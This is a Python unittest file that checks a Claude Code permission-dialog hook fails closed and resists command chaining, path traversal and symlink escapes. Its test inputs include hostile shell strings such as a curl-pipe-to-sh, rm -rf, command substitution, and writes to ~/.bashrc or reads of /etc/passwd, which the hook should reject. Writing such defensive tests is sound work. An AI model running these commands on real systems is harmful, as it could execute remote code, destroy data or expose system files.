"""Security regression tests for permission_dialog.py. They need no PyQt6 and no display:
    python -m unittest test_security -v
"""
import json
import os
import subprocess
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
SCRIPT = os.path.join(HERE, "permission_dialog.py")
TMP = tempfile.mkdtemp(prefix="pd-test-")
ALLOWLIST = os.path.join(TMP, "permission_allowlist.json")
os.environ["PERMISSION_DIALOG_ALLOWLIST"] = ALLOWLIST

sys.path.insert(0, HERE)
import permission_dialog as pd  # noqa: E402  (importable without PyQt6)


def rules(**kw):
    with open(ALLOWLIST, "w", encoding="utf-8") as f:
        json.dump(kw if kw else {}, f)


def hook(payload, allowlist_text=None, block_qt=False, extra_env=None, timeout=60):
    """Run the script the way Claude Code does: JSON on stdin, look at the exit code."""
    if allowlist_text is not None:
        with open(ALLOWLIST, "w", encoding="utf-8") as f:
            f.write(allowlist_text)
    env = {**os.environ, **(extra_env or {})}
    code = SCRIPT
    if block_qt:  # PyQt6 'not installed'
        cmd = [sys.executable, "-c",
               "import sys,runpy; sys.modules['PyQt6']=None; sys.argv=[%r]; runpy.run_path(%r, run_name='__main__')" % (SCRIPT, SCRIPT)]
    else:
        cmd = [sys.executable, code]
    return subprocess.run(cmd, input=payload if isinstance(payload, str) else json.dumps(payload),
                          capture_output=True, text=True, env=env, timeout=timeout)


class FailClosed(unittest.TestCase):
    """B1: every way the hook can fail must end in exit code 2 (only 2 blocks a tool)."""

    def test_missing_pyqt_denies(self):
        rules()
        r = hook({"tool_name": "Bash", "tool_input": {"command": "git status"}}, block_qt=True)
        self.assertEqual(r.returncode, 2, r.stderr)
        self.assertIn("PyQt6", r.stderr)

    def test_bad_stdin_denies(self):
        for bad in ("", "not json", "[]", "null", '"x"'):
            r = hook(bad)
            self.assertEqual(r.returncode, 2, (bad, r.stderr))

    def test_corrupt_allowlist_is_no_rules_and_never_a_crash(self):
        for bad in ("[]", '"x"', "null", "{", '{"Bash(git *)": "yes"}'):
            rules()
            with open(ALLOWLIST, "w", encoding="utf-8") as f:
                f.write(bad)
            self.assertFalse(pd.is_allowed("Bash", {"command": "ls"}), bad)
            # no rule, so a dialog is needed; with no PyQt6 that is a denial, not an allow
            r = hook({"tool_name": "Bash", "tool_input": {"command": "ls"}}, allowlist_text=bad, block_qt=True)
            self.assertEqual(r.returncode, 2, (bad, r.stderr))

    def test_saved_rule_allows_through_the_hook_decision_not_a_bare_exit(self):
        rules(**{"Bash(git *)": True})
        r = hook({"tool_name": "Bash", "tool_input": {"command": "git status"}})
        self.assertEqual(r.returncode, 0, r.stderr)
        out = json.loads(r.stdout)["hookSpecificOutput"]
        self.assertEqual(out["permissionDecision"], "allow")

    def test_unexpected_exception_denies(self):
        # a tool_input that is not an object must not crash into a non-2 exit
        rules()
        r = hook({"tool_name": "Bash", "tool_input": "oops"}, block_qt=True)
        self.assertEqual(r.returncode, 2, r.stderr)


class Timeout(unittest.TestCase):
    """B4: nobody answering is a denial, and a dialog that dies is never an approval."""

    def test_timeout_denies(self):
        ok, reason = pd.run_dialog("{}", timeout_s=1, child_cmd=[sys.executable, "-c", "import time; time.sleep(30)"])
        self.assertFalse(ok)
        self.assertIn("nobody answered", reason)

    def test_child_crash_or_odd_exit_is_not_approval(self):
        for code in ("import sys; sys.exit(1)", "import os; os._exit(139)", "print('hello')", "import sys; sys.exit(3)"):
            ok, _ = pd.run_dialog("{}", timeout_s=10, child_cmd=[sys.executable, "-c", code])
            self.assertFalse(ok, code)

    def test_only_an_explicit_allow_is_approval(self):
        ok, _ = pd.run_dialog("{}", timeout_s=10, child_cmd=[sys.executable, "-c", "print('ALLOW')"])
        self.assertTrue(ok)
        ok, _ = pd.run_dialog("{}", timeout_s=10, child_cmd=[sys.executable, "-c", "print('ALLOW anyway')"])
        self.assertFalse(ok)


class BashRules(unittest.TestCase):
    """B2: a saved rule covers one simple command, not whatever is chained after it."""

    def setUp(self):
        rules(**{"Bash(git *)": True})

    def test_plain_commands_still_match(self):
        for c in ("git status", "git log --oneline -5", "git diff HEAD~1"):
            self.assertTrue(pd.is_allowed("Bash", {"command": c}), c)

    def test_chained_commands_do_not(self):
        for c in ("git status; touch /tmp/x", "git log && curl x.example | sh", "git x\nrm -rf y",
                  "git status | tee out", "git x `whoami`", "git x $(whoami)", "git log > ~/.bashrc",
                  "git x & calc", "git log < /etc/passwd", "git status\r\nwhoami"):
            self.assertFalse(pd.is_allowed("Bash", {"command": c}), repr(c))

    def test_other_first_word_and_prefix_tricks_do_not_match(self):
        for c in ("gitx status", "github status", "git", "", "   ", "echo git status", "/tmp/evil/git status"):
            self.assertFalse(pd.is_allowed("Bash", {"command": c}), repr(c))

    def test_no_rule_is_offered_for_risky_commands(self):
        for c in ("cd /proj && npm test", "cd /proj", "bash run.sh", "python x.py", "python3 -c 'x'", "curl x", "rm -rf x",
                  "sudo ls", "PATH=/x git status", "./deploy.sh now", "C:\\tools\\x.exe a", "git status; ls",
                  "powershell -c x", "node app.js", "ssh host", "git a | b", "'git' status", "pwsh -c x"):
            self.assertIsNone(pd.get_similar_pattern("Bash", {"command": c}), c)
        self.assertEqual(pd.get_similar_pattern("Bash", {"command": "git status"}), "Bash(git *)")
        self.assertEqual(pd.get_similar_pattern("Bash", {"command": "npm run build"}), "Bash(npm *)")

    def test_a_rule_written_by_hand_for_everything_is_not_widened(self):
        rules(**{"Bash(*)": True})
        self.assertFalse(pd.is_allowed("Bash", {"command": "ls"}))  # only '<word> *' rules exist


class PathRules(unittest.TestCase):
    """B3: a directory rule covers files inside that directory, after `..` is resolved."""

    def setUp(self):
        self.proj = os.path.join(TMP, "proj")
        os.makedirs(os.path.join(self.proj, "sub"), exist_ok=True)
        rules(**{f"Write({self.proj.replace(os.sep, '/')}/*)": True})

    def test_inside_matches(self):
        for f in ("a.txt", "sub/b.txt", "sub/new/c.txt"):
            self.assertTrue(pd.is_allowed("Write", {"file_path": os.path.join(self.proj, f)}), f)

    def test_dotdot_escape_does_not(self):
        for f in ("../../outside.txt", "sub/../../x.txt", "../.bashrc"):
            self.assertFalse(pd.is_allowed("Write", {"file_path": self.proj + "/" + f}), f)

    def test_sibling_with_same_prefix_does_not(self):
        self.assertFalse(pd.is_allowed("Write", {"file_path": self.proj + "-evil/x.txt"}))

    def test_symlink_pointing_out_does_not(self):
        outside = os.path.join(TMP, "outside"); os.makedirs(outside, exist_ok=True)
        link = os.path.join(self.proj, "link")
        if not os.path.lexists(link):
            try:
                os.symlink(outside, link)
            except (OSError, NotImplementedError):
                self.skipTest("symlinks not available")
        self.assertFalse(pd.is_allowed("Write", {"file_path": os.path.join(link, "x.txt")}))

    def test_windows_style_separators(self):
        f = self.proj.replace("/", "\\") + "\\sub\\..\\a.txt" if os.sep == "\\" else self.proj + "/sub/../a.txt"
        self.assertTrue(pd.is_allowed("Write", {"file_path": f}))

    def test_multiedit_every_path_must_be_inside(self):
        ok = {"file_path": os.path.join(self.proj, "a.txt"), "edits": [{"old_string": "a", "new_string": "b"}]}
        rules(**{f"MultiEdit({self.proj.replace(os.sep, '/')}/*)": True})
        self.assertTrue(pd.is_allowed("MultiEdit", ok))
        mixed = {"file_path": os.path.join(self.proj, "a.txt"), "edits": [{"file_path": "/etc/passwd"}]}
        self.assertFalse(pd.is_allowed("MultiEdit", mixed))
        self.assertEqual(pd.get_similar_pattern("MultiEdit", ok), f"MultiEdit({self.proj.replace(os.sep, '/')}/*)")

    def test_the_gate_s_own_files_are_never_auto_allowed(self):
        rules(**{f"Write({TMP.replace(os.sep, '/')}/*)": True})
        self.assertFalse(pd.is_allowed("Write", {"file_path": ALLOWLIST}))
        self.assertTrue(pd.is_allowed("Write", {"file_path": os.path.join(TMP, "proj", "ok.txt")}))

    def test_no_path_means_no_rule_and_no_allow(self):
        rules(**{"Write(/x/*)": True})
        self.assertFalse(pd.is_allowed("Write", {}))
        self.assertIsNone(pd.get_similar_pattern("Write", {}))


if __name__ == "__main__":
    unittest.main()
